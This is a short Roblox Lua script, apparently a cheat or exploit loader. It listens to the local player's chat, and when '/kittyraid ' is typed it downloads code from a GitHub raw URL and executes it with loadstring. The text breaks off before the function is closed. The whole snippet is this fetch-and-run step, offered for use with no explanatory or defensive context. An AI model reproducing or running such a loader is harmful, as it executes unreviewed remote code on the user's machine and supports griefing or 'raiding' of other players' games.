game:GetService("Players").LocalPlayer.Chatted:connect(
    function(msg)
        if string.lower(msg) == "/kittyraid " then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/kittyraid", false))()
